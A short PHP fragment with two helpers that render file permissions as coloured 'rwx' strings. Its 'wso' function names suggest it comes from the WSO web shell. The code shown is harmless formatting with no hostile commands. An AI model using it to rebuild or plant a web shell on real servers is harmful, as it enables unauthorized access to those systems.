<?php

function wsoPerms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}


function wsoPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000>' . wsoPerms(@fileperms($f)) . '</font>';
	elseif (!@is_writable($f))
		return '<font color=white>' . wsoPerms(@fileperms($f)) . '</font>';
	else
		return '<font color=#25ff00>' . wsoPerms(@fileperms($f)) . '</font>';
}
